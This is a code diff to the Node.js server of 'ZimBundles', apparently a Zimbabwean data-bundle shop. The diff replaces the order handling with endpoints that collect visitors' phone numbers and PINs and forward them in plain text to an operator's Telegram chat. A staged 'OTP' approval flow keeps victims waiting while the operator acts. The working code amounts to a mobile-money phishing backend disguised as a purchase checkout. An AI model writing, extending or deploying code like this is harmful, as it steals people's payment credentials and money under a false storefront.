@@ -1,6 +1,5 @@
 const express = require("express");
 const path = require("path");
-const fs = require("fs");
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -8,6 +7,7 @@ const PORT = process.env.PORT || 10000;
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
+// Store for active logins/orders
 const orders = new Map();
 let telegramOffset = 0;
 let telegramRunning = false;
@@ -50,6 +50,7 @@ function normalizeZimbabwePhone(phone) {
   return null;
 }
 
+// --- TELEGRAM POLLING ---
 async function startTelegramPolling() {
   if (!telegramConfigured() || telegramRunning) return;
   telegramRunning = true;
@@ -112,7 +113,7 @@ async function handleMessage(message) {
   } else if (text === "/status") {
     await telegram("sendMessage", {
       chat_id: message.chat.id,
-      text: `🟢 ZimBundles bot active\\nOrders in memory: ${orders.size}`
+      text: `🟢 ZimBundles bot active\\nActive sessions: ${orders.size}`
     });
   } else if (text === "/orders") {
     const recent = Array.from(orders.values()).slice(-10).reverse();
@@ -121,119 +122,174 @@ async function handleMessage(message) {
       return;
     }
     for (const o of recent) {
-      await sendOrderCard(o);
+      await notify(`🛒 Order: ${o.id}\\nPhone: ${o.phone}\\nBundle: ${o.bundle}\\nStatus: ${o.status}`);
     }
   }
-}
-
-async function sendOrderCard(order) {
-  const text =
-`🛒 <b>ZimBundles order</b>
-<b>ID:</b> ${order.id}
-<b>Type:</b> ${order.type}
-<b>Bundle:</b> ${order.bundle}
-<b>Price:</b> ${order.price}
-<b>Phone:</b> ${order.phone}
-<b>Status:</b> ${order.status}`;
-
-  const buttons = [[
-    {text:"✅ Approve", callback_data:`approve:${order.id}`},
-    {text:"❌ Reject", callback_data:`reject:${order.id}`}
-  ]];
-
-  await notify(text, buttons);
 }
 
 async function handleCallback(query) {
   if (!isAdminChat(query.message.chat.id)) return;
 
-  const [action, id] = String(query.data || "").split(":");
-  const order = orders.get(id);
+  const [action, phone] = String(query.data || "").split(":");
+  const session = orders.get(phone);
 
-  if (!order) {
-    await telegram("answerCallbackQuery", {
+  if (!session) {
+    return telegram("answerCallbackQuery", {
       callback_query_id: query.id,
-      text: "Order not found."
+      text: "Session expired or not found."
     });
-    return;
   }
 
-  if (action === "approve") order.status = "approved";
-  else if (action === "reject") order.status = "rejected";
-  else return;
+  // --- 1. ADMIN APPROVES PIN ---
+  if (action === "approve_pin") {
+    // Generate random 6-digit OTP
+    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    session.status = "waiting_for_otp";
+    session.otp = otp;
 
-  await telegram("answerCallbackQuery", {
-    callback_query_id: query.id,
-    text: `Order ${order.status}.`
-  });
+    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "PIN Approved." });
+    
+    // Update the original message to show the OTP
+    await telegram("editMessageText", {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      text: `✅ PIN Approved for <b>${phone}</b>\n🛒 Bundle: ${session.bundle}\n💰 Price: $${session.price}\n\n🔐 <b>SECURITY OTP:</b> <code>${otp}</code>\n\n<i>Wait for user to enter OTP.</i>`,
+      parse_mode: "HTML"
+    });
+  } 
+  
+  // --- 2. ADMIN REJECTS PIN ---
+  else if (action === "reject_pin") {
+    session.status = "rejected";
+    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "PIN Rejected." });
+    await telegram("editMessageReplyMarkup", {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      reply_markup: {inline_keyboard: [[{text:`❌ STATUS: REJECTED`, callback_data:"noop"}]]}
+    });
+  }
 
-  await telegram("editMessageReplyMarkup", {
-    chat_id: query.message.chat.id,
-    message_id: query.message.message_id,
-    reply_markup: {inline_keyboard: [[{text:`Status: ${order.status.toUpperCase()}`, callback_data:"noop"}]]}
-  });
+  // --- 3. ADMIN APPROVES OTP ---
+  else if (action === "approve_otp") {
+    session.status = "success";
+    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "OTP Approved. User logged in." });
+    await telegram("editMessageReplyMarkup", {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      reply_markup: {inline_keyboard: [[{text:`✅ STATUS: LOGIN SUCCESSFUL`, callback_data:"noop"}]]}
+    });
+  }
 
-  await notify(`📢 Order <b>${order.id}</b> is now <b>${order.status.toUpperCase()}</b>.`);
+  // --- 4. ADMIN REJECTS OTP ---
+  else if (action === "reject_otp") {
+    session.status = "rejected";
+    await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "OTP Rejected." });
+    await telegram("editMessageReplyMarkup", {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      reply_markup: {inline_keyboard: [[{text:`❌ STATUS: OTP REJECTED`, callback_data:"noop"}]]}
+    });
+  }
 }
 
-app.get("/api/health", (req, res) => {
-  res.json({
-    ok: true,
-    service: "zimbundles",
-    telegram: telegramConfigured() ? "configured" : "not_configured",
-    payment: "EcoCash integration pending"
-  });
-});
+// --- API ENDPOINTS FOR THE WEBSITE ---
 
-app.post("/api/orders", async (req, res) => {
-  const {bundle, price, phone, type = "bundle"} = req.body;
+// 1. Frontend sends Phone + PIN
+app.post("/api/request-login", async (req, res) => {
+  const { phone, pin, bundle, price } = req.body;
   const normalizedPhone = normalizeZimbabwePhone(phone);
-  const numericPrice = Number(price);
 
-  if (!bundle || !Number.isFinite(numericPrice) || numericPrice < 0 || !normalizedPhone) {
-    return res.status(400).json({ok:false, error:"Valid bundle, price and Zimbabwe phone number are required."});
+  if (!normalizedPhone || !pin || !bundle) {
+    return res.status(400).json({ ok:false, error: "Valid phone, PIN, and bundle are required." });
   }
 
-  const order = {
-    id: makeId(type === "trial" ? "TRIAL" : "ORDER"),
-    type,
-    bundle,
-    price: numericPrice,
+  // Save the session keyed by the phone number
+  orders.set(normalizedPhone, {
     phone: normalizedPhone,
-    status: "pending",
+    pin: pin,
+    bundle: bundle,
+    price: price,
+    status: "pending_pin",
     createdAt: new Date().toISOString()
-  };
+  });
 
-  orders.set(order.id, order);
+  // Send to Telegram
+  if (telegramConfigured()) {
+    const text = `🚨 <b>New Purchase Request</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔑 <b>PIN:</b> ${pin}\n\n🛒 <b>Bundle:</b> ${bundle}\n💰 <b>Price:</b> $${price}\n\n<i>Approve PIN to generate OTP.</i>`;
+    const buttons = [[
+      {text:"✅ Approve PIN", callback_data:`approve_pin:${normalizedPhone}`},
+      {text:"❌ Reject", callback_data:`reject_pin:${normalizedPhone}`}
+    ]];
+    await notify(text, buttons);
+  }
+
+  res.status(200).json({ ok: true, message: "Waiting for admin approval." });
+});
+
+// 2. Frontend polls this to check if PIN was approved
+app.get("/api/check-pin-status/:phone", (req, res) => {
+  const session = orders.get(normalizeZimbabwePhone(req.params.phone));
+  if (!session) return res.status(404).json({ status: "not_found" });
+
+  if (session.status === "pending_pin") return res.json({ status: "pending" });
+  if (session.status === "rejected") return res.json({ status: "rejected" });
+  
+  // If we passed pending_pin and aren't rejected, OTP was generated
+  return res.json({ status: "approved" });
+});
+
+// 3. Frontend sends the OTP the user typed
+app.post("/api/verify-otp", async (req, res) => {
+  const { phone, otp } = req.body;
+  const normalizedPhone = normalizeZimbabwePhone(phone);
+  const session = orders.get(normalizedPhone);
+
+  if (!session || session.status !== "waiting_for_otp") {
+    return res.status(400).json({ error: "Invalid request state." });
+  }
+
+  if (session.otp !== otp) {
+    return res.status(400).json({ error: "Incorrect OTP. Please check with admin." });
+  }
+
+  // OTP is correct! Move to waiting for final admin approval
+  session.status = "pending_otp_approval";
 
   if (telegramConfigured()) {
-    await sendOrderCard(order);
+    const text = `🔔 <b>OTP Entered by User</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔢 <b>OTP:</b> <code>${otp}</code>\n🛒 <b>Bundle:</b> ${session.bundle}\n\n<i>Approve to finalize purchase?</i>`;
+    const buttons = [[
+      {text:"✅ Approve OTP", callback_data:`approve_otp:${normalizedPhone}`},
+      {text:"❌ Reject OTP", callback_data:`reject_otp:${normalizedPhone}`}
+    ]];
+    await notify(text, buttons);
   }
 
-  res.status(201).json({
-    ok: true,
-    orderId: order.id,
-    status: order.status,
-    message: telegramConfigured()
-      ? "Request sent for admin review."
-      : "Order created. Configure Telegram on Render for admin notifications."
-  });
+  res.status(200).json({ ok: true, message: "Waiting for final OTP approval." });
 });
 
-app.get("/api/orders/:id", (req, res) => {
-  const order = orders.get(req.params.id);
-  if (!order) return res.status(404).json({ok:false, error:"Order not found"});
-  res.json({ok:true, order});
-});
+// 4. Frontend polls this to check if OTP was finally approved
+app.get("/api/check-otp-status/:phone", (req, res) => {
+  const session = orders.get(normalizeZimbabwePhone(req.params.phone));
+  if (!session) return res.status(404).json({ status: "not_found" });
 
-app.get("/api/telegram-test", async (req, res) => {
-  if (!telegramConfigured()) {
-    return res.status(400).json({ok:false, error:"Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID on Render."});
+  if (session.status === "pending_otp_approval") return res.json({ status: "pending" });
+  if (session.status === "rejected") return res.json({ status: "rejected" });
+  
+  if (session.status === "success") {
+    // Optional: delete the session after success to free memory
+    // orders.delete(normalizedPhone); 
+    return res.json({ status: "success" });
   }
-  const result = await notify("🟢 <b>ZimBundles test notification</b> — Telegram is connected.");
-  res.json(result);
+  
+  return res.json({ status: "pending" });
 });
 
+// Health check
+app.get("/api/health", (req, res) => {
+  res.json({ ok: true, service: "zimbundles", telegram: telegramConfigured() ? "configured" : "not_configured" });
+});
+
+// Catch-all to serve index.html
 app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
